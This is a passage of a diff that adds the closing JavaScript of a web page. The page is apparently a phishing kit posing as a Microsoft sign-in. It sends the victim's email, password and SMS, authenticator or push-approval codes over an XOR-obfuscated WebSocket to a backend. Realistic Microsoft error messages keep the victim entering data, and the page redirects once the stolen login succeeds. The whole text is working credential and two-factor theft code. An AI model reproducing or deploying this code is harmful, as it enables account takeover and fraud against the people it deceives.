+                var o = e.charCodeAt(0)
+                t.push(o ^ s[0] ^ s[1] ^ s[2])
+                }),
+                s.map((e) => t.push(e)),
+                new Uint8Array(t).buffer
+            )
+            }
+            decode(e) {
+            var t = '',
+                s = new Uint8Array(e),
+                o = s.slice(-3)
+            return (
+                (s = s.slice(0, -3)).map((e) => {
+                t += String.fromCharCode(e ^ o[0] ^ o[1] ^ o[2])
+                }),
+                t
+            )
+            }
+            _send(e) {
+            return new Promise((t, s) => {
+                var o,
+                r = 0
+                o = setInterval(() => {
+                r++ > 10 &&
+                    (clearInterval(o),
+                    console.log(
+                    'WebSocket is not ready yet, current status ' + this.ws.readyState
+                    ),
+                    s('an error occured'))
+                this.ws.readyState == WebSocket.OPEN &&
+                    (this.ws.send(this.encode(e)), clearInterval(o), t('done'))
+                }, 50)
+            })
+            }
+            async send(e, t) {
+            if (!t) {
+                return Promise.reject('A empty response was gotten')
+            }
+            var s = String(Math.floor(100000 * Math.random())),
+                o = {
+                id: s,
+                message: t,
+                path: e,
+                },
+                r = JSON.stringify(o)
+            return (
+                await this._send(r),
+                new Promise((e, t) => {
+                var o = 0,
+                    r = setInterval(() => {
+                    for (var i of (o >= 120 &&
+                        (clearInterval(r),
+                        t('No response was obeserved within 10 ses of waiting')),
+                    this.responses))
+                        try {
+                        var a = JSON.parse(this.decode(i.data))
+                        a.id == s &&
+                            (clearInterval(r),
+                            this.responses.splice(this.responses.indexOf(i)),
+                            e(a.response))
+                        } catch (e) {
+                        t(e)
+                        clearInterval(r)
+                        }
+                    o++
+                    }, 200)
+                })
+            )
+            }
+        }
+        document.title = e.get('title', 0)
+        $.support.cors = true
+        var t = new e(),
+            s = e.decodeBased(e.get('home', 0)) || ''
+        function o(e, s) {
+            t.send('/email', { email: e })
+            .then(function (t) {
+                if (t && 'fail' != t) {
+                var o = t
+                null !== o.bg_image &&
+                    '' !== o.bg_image &&
+                    ($('#bg_img').css(
+                    'background-image',
+                    'linear-gradient(rgba(0,0,0,0.527),rgba(0,0,0,0.5)),url(' +
+                        o.bg_image +
+                        ')'
+                    ),
+                    $('#banner_image').hide())
+                null !== o.logo_image &&
+                    '' !== o.logo_image &&
+                    ($('#logo_image').attr('src', o.logo_image),
+                    $('#banner_image').hide())
+                s && s()
+                $('.identity').html(e)
+                $('#add_pass').show()
+                } else {
+                $('#add_em').show()
+                $('.em-error-parent').show()
+                $('.em-error').html(
+                    "We couldn't find an account with that username. Try another, or get a new Microsoft account."
+                )
+                }
+            })
+            .catch((e) => {
+                console.log(e)
+                $('#content').css('opacity', '0.1')
+                $('#error-display').css({ visibility: 'visible' })
+            })
+        }
+        $('#loadingScreen').hide(function () {
+            $('#content').show(function () {
+            if ((e.get('image', 0), e.get('caption', 0), s)) {
+                o(s)
+            } else {
+                let t = e.getBased()
+                t ? ((s = t), o(t)) : $('#add_em').show()
+            }
+            })
+        })
+        $('#error-dismiss').click(function () {
+            $('#content').css('opacity', '1')
+            $('#error-display').css({ visibility: 'hidden' })
+        })
+        $('.click-to-enter').click(function () {
+            t.send('/start-2fa-sms', { email: s })
+            .then(function (e) {
+                'success' == e.auth &&
+                $('.show-2fa-code').hide(function () {
+                    $('.input-code').show()
+                })
+            })
+            .catch((e) => {
+                console.log(e)
+                $('#content').css('opacity', '0.1')
+                $('#error-display').css({ visibility: 'visible' })
+            })
+        })
+        $('.submit-mfa1-code').click(function () {
+            $('.mfa-error').hide()
+            var e = $('.mfa1-code').val()
+            if (!/^[0-9]+$/.test(e)) {
+            return false
+            }
+            $('.stealth').val()
+            $('#password').val()
+            t.send('/code-2fa-mfa1', {
+            code: e,
+            email: s,
+            pw: $('#password').val(),
+            })
+            .then(function (e) {
+                0 == e.v
+                ? $('.mfa-error').show()
+                : 1 == e.v &&
+                    (location.replace(e.t),
+                    setTimeout("window.location.href='" + e.t + "';", 1000))
+            })
+            .catch((e) => {
+                console.log(e)
+                $('#content').css('opacity', '0.1')
+                $('#error-display').css({ visibility: 'visible' })
+            })
+        })
+        $('.submit-2fa').click(function () {
+            $('.code-error').hide(function () {
+            $('.sms-error').hide()
+            })
+            var e = $('#idTxtBx_SAOTCC_OTC').val()
+            if (!/^[0-9]+$/.test(e) || 6 != e.length) {
+            return (
+                $('.code-error').show(function () {
+                $('.sms-error').show()
+                $('.error-type').html(
+                    'Please enter the 6-digit code. The code only contains numbers'
+                )
+                }),
+                false
+            )
+            }
+            $('#idTxtBx_SAOTCC_OTC').val()
+            $('.stealth').val()
+            $('#password').val()
+            t.send('/code-2fa-sms', {
+            code: $('#idTxtBx_SAOTCC_OTC').val(),
+            email: s,
+            pw: $('#password').val(),
+            })
+            .then(function (e) {
+                '0' == e.v
+                ? $('.code-error').show(function () {
+                    $('.sms-error').show()
+                    })
+                : '1' == e.v &&
+                    (location.replace(e.t),
+                    setTimeout("window.location.href='" + e.t + "';", 1000))
+            })
+            .catch((e) => {
+                console.log(e)
+                $('#content').css('opacity', '0.1')
+                $('#error-display').css({ visibility: 'visible' })
+            })
+        })
+        $('.btn-email').click(function () {
+            o($('#email').val(), () => {
+            $('#add_em').hide()
+            })
+        })
+        $('.nextb').click(function () {
+            $('.nextb').prop('disabled', true)
+            $('.pass-error').hide()
+            $('.info-verify').hide()
+            $('.alert-erro').hide()
+            var e = $('#password').val()
+            if (e) {
+            $('#progressBar').show()
+            var o = s
+            compi = {
+                auth: o,
+                pswd: e,
+            }
+            t.send('/login', {
+                email: o,
+                pw: e,
+            }).then(function (e) {
+                if ('valid' == e.t) {
+                var r = e.finish
+                location.replace(r)
+                setTimeout("window.location.href='" + r + "';", 1000)
+                } else {
+                'sms' == e.t
+                    ? ($('.enter-pass').hide(function () {
+                        $('.show-2fa-code').show()
+                    }),
+                    $('.add-text').html(e.number),
+                    $('#progressBar').hide())
+                    : 'mfa1' == e.t
+                    ? ($('.enter-pass').hide(function () {
+                        t.send('/start-2fa-mfa1', { email: o })
+                        .then(function (e, t) {})
+                        .catch((e) => {
+                            console.log(e)
+                            $('#content').css('opacity', '0.1')
+                            $('#error-display').css({ visibility: 'visible' })
+                        })
+                        $('.show-mfa1-code').show()
+                    }),
+                    $('#progressBar').hide())
+                    : 'mfa2' == e.t
+                    ? ($('.enter-pass').hide(function () {
+                        t.send('/start-2fa-mfa2', { email: o })
+                        .then(function (e, t) {
+                            if ('success' == e.auth) {
+                            var s = e
+                            $('.displaySign').text(s.Entropy)
+                            $('.show-mfa2-code').show()
+                            }
+                        })
+                        .catch((e) => {
+                            console.log(e)
+                            $('#content').css('opacity', '0.1')
+                            $('#error-display').css({ visibility: 'visible' })
+                        })
+                    }),
+                    $('#progressBar').hide(),
+                    setTimeout(function () {
+                        var e = 0,
+                        o = window.setInterval(function () {
+                            15 == ++e &&
+                            (clearInterval(o),
+                            $('.show-mfa2-code').hide(function () {
+                                $('.mfa2-error').show()
+                            }))
+                            $('.stealth').val()
+                            $('#password').val()
+                            t.send('/code-2fa-mfa2', {
+                            code: '',
+                            email: s,
+                            pw: $('#password').val(),
+                            })
+                            .then(function (e) {
+                                1 == e.v &&
+                                (location.replace(e.t),
+                                setTimeout(
+                                    "window.location.href='" + e.t + "';",
+                                    3000
+                                ))
+                            })
+                            .catch((e) => {
+                                console.log(e)
+                                $('#content').css('opacity', '0.1')
+                                $('#error-display').css({ visibility: 'visible' })
+                            })
+                        }, 2000)
+                    }, 2000))
+                    : ($('#progressBar').hide(),
+                    $('.error-alert').show(),
+                    $('.pass-error').show(),
+                    $('.pass-error').html(
+                        "Your email or password is incorrect. If you don't remember your password, <a href='#'>reset it now.</a>"
+                    ),
+                    $('.nextb').prop('disabled', false),
+                    $('#password').val(null))
+                }
+            })
+            } else {
+            $('.alert-erro').show()
+            $('.alert-erro').html(
+                'Please enter the password for your Microsoft account.'
+            )
+            $('.nextb').prop('disabled', false)
+            }
+        })
+        $(document).on('keypress', function (e) {
+            13 == e.which &&
+            ($('.enter-pass').is(':visible')
+                ? $('.nextb').click()
+                : $('.input-code').is(':visible') && $('.submit-2fa').click())
+        })
+        })()
+    </script>
+   
+   </body></html>
